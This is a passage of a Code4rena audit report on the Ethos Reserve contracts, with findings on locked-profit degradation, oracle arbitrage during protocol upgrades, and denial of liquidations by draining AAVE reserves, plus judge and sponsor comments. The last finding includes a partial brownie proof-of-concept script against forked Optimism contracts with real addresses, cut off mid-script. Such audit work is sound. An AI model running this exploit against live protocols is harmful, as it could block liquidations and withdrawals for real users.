unlocked funds will be treated as locked again if <code>lockedProfitDegradation</code> is decreased.</p>\n<p>Even if there is no front run as all depositors are pools, it’s not fair to change locked/unlocked amounts that are confirmed already.</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We should modify <code>setLockedProfitDegradation()</code> like below.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setLockedProfitDegradation</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">degradation</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_atLeastRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ADMIN</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">degradation</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">DEGRADATION_COEFFICIENT</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Degradation cannot be more than 100%&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update lockedProfit and lastReport</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">lockedProfit</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_calculateLockedProfit</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">lastReport</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">lockedProfitDegradation</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">degradation</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LockedProfitDegradationUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">degradation</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/728#issuecomment-1460451373\">Trust (judge) increased severity to High</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/728#issuecomment-1466622615\">tess3rac7 (Ethos Reserve) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>I don’t think this qualifies as a “high”. It relies on a large harvest, followed by no harvests for a considerable amount of time, followed by the ADMIN (multisig) calling <code>setLockedProfitDegradation()</code> to set the degradation to a smaller value and being front-run by a malicious user calling <code>deposit()</code>.</p>\n<ul>\n<li>depositors are whitelisted via the <code>DEPOSITOR</code> role, so in this case they are trusted</li>\n<li>the ADMIN multisig wouldn’t randomly change the degradation value without a really good reason to do so</li>\n<li>even if a whitelisted depositor turns malicious, and the ADMIN multisig ends up invoking <code>setLockedProfitDegradation()</code>, and ADMIN’s TX gets front-run by said malicious depositor, it would, at best, result in some extra yield being squeezed by the malicious depositor—ONLY IF they have enough capital to overshadow the vault’s TVL. There would be no loss of principal assets whatsoever for any depositor.</li>\n</ul>\n<p>There is slim chance for favorable conditions for this type of attack to succeed, and the capital requirements for the attacker would be quite high. And even after doing all this, they would at best earn a few more tokens out of the locked yield without impact any other user’s deposits. It’s not even a repeatable attack because ADMIN won’t keep calling <code>setLockedProfitDegradation()</code> over and over. Very low risk in my opinion.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/728#issuecomment-1476200592\">Trust (judge) decreased severity to Medium</a></strong></p>\n<hr>\n<h2 id=\"m-05-upgradeprotocol-can-create-peg-risk-via-oracle-price-arbitrage\" style=\"position:relative;\"><a href=\"#m-05-upgradeprotocol-can-create-peg-risk-via-oracle-price-arbitrage\" aria-label=\"m 05 upgradeprotocol can create peg risk via oracle price arbitrage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/708\">[M-05] <code>upgradeProtocol</code> can create Peg Risk via Oracle Price Arbitrage</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/708\">GalloDaSballo</a></em></p>\n<p><code>upgradeProtocol</code> is meant to enable a new version of the protocol while retaining the same LUSD token.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LUSDToken.sol#L160-L181\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LUSDToken.sol#L160-L181</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">upgradeProtocol</span><span class=\"mtk1\">(</span></span></span></code></pre>\n<p>In case of a migration, with the same collateral, but a new oracle, the system could open up to arbitrage between the two oracles via redemptions, allowing to extract value from the difference between the 2 prices.</p>\n<p>This is because each oracle (e.g. chainlink), can change it’s price based on two aspects:</p>\n<ul>\n<li>Hearbeat -> Maximum amount of time before the feed is updated</li>\n<li>Threshold -> % change at which the price is changed no matter what</li>\n</ul>\n<p>In case of the oracle being different, for example having a different heartbeat setting, or simply having a different cadence (e.g. one refreshes at noon the other at 3 pm), the difference can open up to Arbitrage Strategies that can potentially increase risk to the system.</p>\n<h3 id=\"arbitrage-through-redemptions-explanation\" style=\"position:relative;\"><a href=\"#arbitrage-through-redemptions-explanation\" aria-label=\"arbitrage through redemptions explanation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Arbitrage through Redemptions Explanation</h3>\n<p>The fact that that older version of the protocol can burn means they could allow for redemption arbitrage, leaking value.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LUSDToken.sol#L366-L367\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LUSDToken.sol#L366-L367</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// old versions of the protocol may still burn</span></span></span></code></pre>\n<p>Burning of tokens can be performed via two operations:</p>\n<ul>\n<li>Repayment</li>\n<li>Redemptions</li>\n</ul>\n<p>Repayment seems to be safest options and it’s hard to imagine a scenario for exploit.</p>\n<p>If the oracle offers a different price for redemptions, that can crate an incentive to go redeem against the older system, and since the older system cannot create new Troves, the CR for it could suffer.</p>\n<p>The way in which this get’s problematic is if there’s positions that risk becoming under-collateralized in the old system and the debt from those positions is used to redeem against better collateralized positions on the new migrated system</p>\n<p>This would create an economic incentive to leave the bad debt in older system as the new one is offering a more profitable opportunity.</p>\n<h3 id=\"additional-resources\" style=\"position:relative;\"><a href=\"#additional-resources\" aria-label=\"additional resources permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Additional Resources</h3>\n<p>An example of desynch is what happened to a Gearbox Ninja, that got liquidated due to hearbeat differences</p>\n<p><a href=\"https://twitter.com/gearbox_intern/status/1587957233605918721\">https://twitter.com/gearbox_intern/status/1587957233605918721</a></p>\n<h3 id=\"remediation-steps\" style=\"position:relative;\"><a href=\"#remediation-steps\" aria-label=\"remediation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Remediation Steps</h3>\n<p>It will be best to ensure that a collateral is either in the old system, or on the new system, and if the same collateral is in both version, I believe the Oracle must be the same as to avoid inconsistent pricing.</p>\n<p>It may also be best to change the migration pattern to one based on Zaps, which will offer good UX but reduce risk to the LUSD peg dynamic.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/708#issuecomment-1460483024\">Trust (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Warden did well to state all the hypotheticals, however imo the requirement that the two oracles must be different for this opportunity to arise is too theoretical for medium severity. Will leave for sponsor review.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/708#issuecomment-1468471991\">tess3rac7 (Ethos Reserve) disputed and commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>however imo the requirement that the two oracles must different for this opportunity to arise is too theoretical for med severity. Will leave for sponsor review.</p>\n</blockquote>\n<p>Agree. Warden also overlooked redemption fee, which could be a very large % depending on the ratio of <code>redeemedAmount :: total outstanding debt of market in old protocol.</code> No one would arb if money is lost on each redemption.</p>\n<p>Seems more just like an informational warning to use the same oracles if we ever upgrade rather than a bug report.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-denial-of-liquidations-and-redemptions-by-borrowing-all-reserves-from-aave\" style=\"position:relative;\"><a href=\"#m-06-denial-of-liquidations-and-redemptions-by-borrowing-all-reserves-from-aave\" aria-label=\"m 06 denial of liquidations and redemptions by borrowing all reserves from aave permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/693\">[M-06] Denial of Liquidations and Redemptions by borrowing all reserves from AAVE</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/693\">GalloDaSballo</a>, also found by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/671\">Koolex</a> and <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/629\">GalloDaSballo</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L239\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L239</a><br>\n<a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L200\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L200</a></p>\n<p>Liquidations and Redemptions can be prevented by making <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L239\"><code>ActivePool._rebalance</code></a> revert by borrowing all collateral from AAVEs lendingPool.</p>\n<p>The ActivePool will invest in the Vault, which will use the strategy to invest in the lending pool.</p>\n<p>When withdrawing collateral, by Closing CDPs, Redeeming or Liquidating, <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L174\"><code>_rebalance</code></a> will be called.</p>\n<p>In most logical cases (high capital efficiency), this will trigger a <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L385\">withdrawal from the Strategy</a></p>\n<p>Which will trigger a <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L200\">withdrawawal from the LendingPool</a>,</p>\n<p>An attacker can deny this operation <a href=\"https://medium.com/aave/understanding-the-risks-of-aave-43334dbfc6d0#:~:text=This%20situation%20can%20be%20problematic%20if%20depositors%20wish%20to%20withdraw%20their%20liquidity%2C%20but%20no%20funds%20are%20available.\">by borrowing all reserves from AAVE</a>.</p>\n<p>This will prevent all Liquidations, Redemptions as well as withdrawals, at will of the attacker.</p>\n<p>This can be done to force the protocol to enter Recovery Mode, force re-absorptions and it can be pushed as far as to trigger bad debt.</p>\n<p>Note that the attack can be performed maliciously without the need for a front-run, a sandwich (front-run + back-run) will just make it less costly (less interest paid) for the attacker but is not a way to prevent the attack.</p>\n<h3 id=\"preamble-to-the-poc\" style=\"position:relative;\"><a href=\"#preamble-to-the-poc\" aria-label=\"preamble to the poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Preamble to the POC</h3>\n<p>Any time funds are pulled from the ActivePool, <code>_rebalance</code> is called.</p>\n<p>We know that if a withdrawal is sizeable enough, <code>_rebalance</code> will trigger <code>Strategy._withdraw</code> which will attempt to <code>withdraw</code> from the lending pool.</p>\n<p>The goal of the POC then is to show how we can make it impossible to perform a withdrawal, guaranteeing a revert on all calls to <code>_rebalance</code> which consequently will brick Redemptions and Liquidations</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The POC is coded in brownie, I have setup a MockFile to be able to fork optimism, with the final addresses hardcoded in the strategy (Granary).</p>\n<p><strong>Goal of the POC</strong></p>\n<p>The goal of the POC is to demonstrate that withdrawals from the pool can be denied.</p>\n<p>This shows how we can trigger a revert against <code>LendingPool.withdraw</code> which we know will cause <code>_rebalance</code> to revert as well</p>\n<p><strong>Coded POC</strong></p>\n<p>The following mock allows us to interact with the forked contracts</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: BUSL-1.1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LendingPool</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">onBehalfOf</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">referralCode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">borrow</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interestRateMode</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">referralCode</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">onBehalfOf</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>We can then fork optimism mainnet</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"bash\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">brownie console --network optimism-main-fork</span></span></span></code></pre>\n<p>Run the following commands to show the attack</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"python\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Setup addresses</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">lp = LendingPool.at(</span><span class=\"mtk8\">&quot;0x8FD4aF47E4E63d1D2D45582c3286b4BD9Bb95DfE&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">a_token = interface.ERC20(</span><span class=\"mtk8\">&quot;0xfF94cc8E2c4B17e3CC65d7B83c7e8c643030D936&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">weth = interface.ERC20(</span><span class=\"mtk8\">&quot;0x4200000000000000000000000000000000000006&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">usdc = interface.ERC20(</span><span class=\"mtk8\">&quot;0x7F5c764cBc14f9669B88837ca1490cCa17c31607&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Setup Actors</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">weth_whale = accounts.at(</span><span class=\"mtk8\">&quot;0xe50fa9b3c56ffb159cb0fca61f5c9d750e8128c8&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">force</span><span class=\"mtk1\">=</span><span class=\"mtk4\">True</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">usdc_whale = accounts.at(</span><span class=\"mtk8\">&quot;0x625e7708f30ca75bfd92586e17077590c60eb4cd&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">force</span><span class=\"mtk1\">=</span><span class=\"mtk4\">True</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">strategy = a[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">exploiter = a[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Fund Strategy with WETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">weth.transfer(strategy, </span><span class=\"mtk7\">20e18</span><span class=\"mtk1\">, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: weth_whale})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Strategy Deposits WETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">weth.approve(lp, </span><span class=\"mtk7\">20e18</span><span class=\"mtk1\">, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: strategy})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">lp.deposit(weth, </span><span class=\"mtk7\">20e18</span><span class=\"mtk1\">, strategy, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, {</span><span class=\"mtk8\">&quot;from&quot;</span><span class=\"mtk1\">: strategy})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">## Fund exploiter with USDC, they will borrow WETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">usdc.transfer(exploiter, usdc.balanceOf(usdc_whale), {</span><span 